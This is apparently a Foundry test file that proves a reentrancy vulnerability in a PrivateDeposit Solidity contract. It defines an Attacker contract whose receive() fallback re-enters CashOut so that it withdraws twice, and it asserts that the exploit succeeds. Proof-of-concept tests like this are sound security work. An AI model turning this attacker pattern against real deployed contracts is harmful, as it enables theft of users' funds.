
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {
    
    PrivateDeposit public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // MinDeposit is 1 ether, so we must assume attackVal is at least that.
        // We also cap it to avoid overflow issues in setup, though 0.8.x handles it.
        vm.assume(attackVal >= 1 ether && attackVal < 100 ether);

        // Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract (address(this)) to send to Attacker
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateDeposit public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PrivateDeposit(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Perform preparation steps (deposit)
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        // Call the vulnerable function
        _victim.CashOut(val);

        // Verify Success Conditions.
        // If we successfully re-entered and withdrew funds twice, our balance 
        // should be greater than initial + the single withdrawal amount.
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            _victim.CashOut(storedAttackVal);
        }
    }
}
